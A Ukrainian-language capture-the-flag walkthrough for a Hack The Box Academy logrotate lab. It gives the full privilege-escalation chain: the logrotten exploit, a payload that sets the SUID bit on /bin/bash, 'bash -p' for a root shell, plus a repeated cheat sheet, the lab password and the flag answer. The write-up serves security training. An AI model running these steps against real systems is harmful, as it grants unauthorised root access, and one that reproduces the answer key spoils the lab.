## Containers – Logrotate

Ціль: `10.129.115.63`  

Питання:
- Escalate privileges і здати вміст `flag.txt` як відповідь.

Відповідь:
- `HTB{l0G_r0t7t73N_00ps}`

***

## Правильні кроки експлуатації logrotate (без зайвих/помилкових дій)

### 1. Пошук локальних логів з правами запису

На цілі:

```bash
find ~ -type f -name "*.log" 2>/dev/null
# /home/htb-student/backups/access.log
```

- Маємо лог-файл у домашній директорії, до якого `htb-student` має запис.
- Це саме той лог, який використовує уразлива конфігурація logrotate.

### 2. Підготувати експлойт logrotten

На Pwnbox (локальна машина):

```bash
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
scp logrotten.c htb-student@10.129.115.63:/home/htb-student/
# введення пароля: HTB_@cademy_stdnt!
```

На цілі:

```bash
cd ~
gcc logrotten.c -o logrotten
chmod +x logrotten
```

> Твої помилки були в тому, що ти запускав `gcc logrotten.c` до того, як скопіював файл, і пробував `chmod +x logrotten`, коли бінарника ще не існувало.  

### 3. Підготувати payload

Для цього завдання payload уже не робить реверс-шелл, а ставить SUID на `/bin/bash` (це видно з фінального стану системи). Тому правильний варіант:

```bash
echo 'chmod u+s /bin/bash' > payload
```

Це і є той `./payload`, який буде виконаний root-процесом logrotate після ротації. [infosecwriteups](https://infosecwriteups.com/hackthebox-academy-privilege-escalation-ca0a8ad2259e)

### 4. Запустити logrotten на лог-файлі

На цілі:

```bash
echo "test" > /home/htb-student/backups/access.log
./logrotten -p ./payload /home/htb-student/backups/access.log
```

Коректний вихід:

```text
Waiting for rotating /home/htb-student/backups/access.log...
Renamed /home/htb-student/backups with /home/htb-student/backups2 and created symlink to /etc/bash_completion.d
Waiting 1 seconds before writing payload...
Done!
```

Що відбувається: [infosecwriteups](https://infosecwriteups.com/hackthebox-academy-privilege-escalation-ca0a8ad2259e)

- `logrotten` чекає, поки logrotate ротує `access.log`.
- Підмінює каталог з логами на симлінк у системний шлях, де запускається logrotate.
- Після ротації записує `payload` так, щоб logrotate виконав його як root.
- Payload робить `chmod u+s /bin/bash`.

### 5. Перевірити, що `/bin/bash` став SUID

```bash
ls -l /bin/bash
# -rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

- Тепер у байті прав власника `rws` – є SUID-біт (`s`).
- Це означає, що запуск `/bin/bash` буде з привілеями root. [infosecwriteups](https://infosecwriteups.com/hackthebox-academy-privilege-escalation-ca0a8ad2259e)

***

## Отримання root і читання флагу

### 6. Отримати root-шелл

```bash
bash -p
```

- `-p` – зберегти ефективні UID/GID, не скидати їх.
- Оскільки файл SUID root, bash запускається як `uid=0`.

Перевірка:

```bash
bash-5.0# whoami
root
```

### 7. Прочитати флаг

```bash
bash-5.0# cd /root
bash-5.0# ls
cron_root  flag.txt  log.cfg  log.sh  reset.sh  snap
bash-5.0# cat flag.txt
HTB{l0G_r0t7t73N_00ps}
```

Відповідь:

> `HTB{l0G_r0t7t73N_00ps}`

***

## Шпаргалка: Logrotate + logrotten

### Сценарій

- Маємо world-/user-writable лог, який крутить `logrotate` як root.
- Версія `logrotate` уразлива (з експлойта).
- Можемо підмінити шлях логів так, щоб logrotate виконав наш payload.

### Кроки

1. **Знайти лог-файл у домашній директорії:**

   ```bash
   find ~ -type f -name "*.log" 2>/dev/null
   # /home/htb-student/backups/access.log
   ```

2. **Підготувати logrotten:**

   - На локальній машині:

     ```bash
     git clone https://github.com/whotwagner/logrotten.git
     cd logrotten
     scp logrotten.c htb-student@10.129.115.63:/home/htb-student/
     ```

   - На цілі:

     ```bash
     cd ~
     gcc logrotten.c -o logrotten
     chmod +x logrotten
     ```

3. **Задати payload:**

   ```bash
   echo 'chmod u+s /bin/bash' > payload
   ```

4. **Запустити експлойт:**

   ```bash
   echo "test" > /home/htb-student/backups/access.log
   ./logrotten -p ./payload /home/htb-student/backups/access.log
   ```

5. **Перевірити `/bin/bash`:**

   ```bash
   ls -l /bin/bash
   # -rwsr-xr-x ...
   ```

6. **Root-шелл + флаг:**

   ```bash
   bash -p
   cd /root
   cat flag.txt
   # HTB{l0G_r0t7t73N_00ps}
   ```
